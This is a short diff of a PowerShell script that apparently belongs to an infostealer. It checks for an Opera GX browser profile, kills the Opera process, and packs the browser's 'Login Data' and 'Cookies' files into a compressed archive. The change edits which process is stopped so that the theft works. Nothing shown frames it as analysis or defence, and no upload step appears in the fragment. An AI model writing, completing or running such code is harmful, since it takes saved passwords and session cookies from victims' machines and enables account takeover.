@@ -60,7 +60,7 @@ else{echo "Oasd";$e=$e+'Oasd'}
 
 $og=($env:APPDATA+"\Opera Software\Opera GX Stable\");
 if(Test-Path -Path $og){
-  Stop-Process -Name browser -ErrorAction SilentlyContinue;
+  Stop-Process -Name opera -ErrorAction SilentlyContinue;
   if("WinRAR" -in $arh)
     {Get-ChildItem -Path $og -Include ("Login Data"), ("Cookies") -Recurse | Compress-Archive -CompressionLevel Fastest -DestinationPath $p}
   elseif("7-Zip"-in $arh)
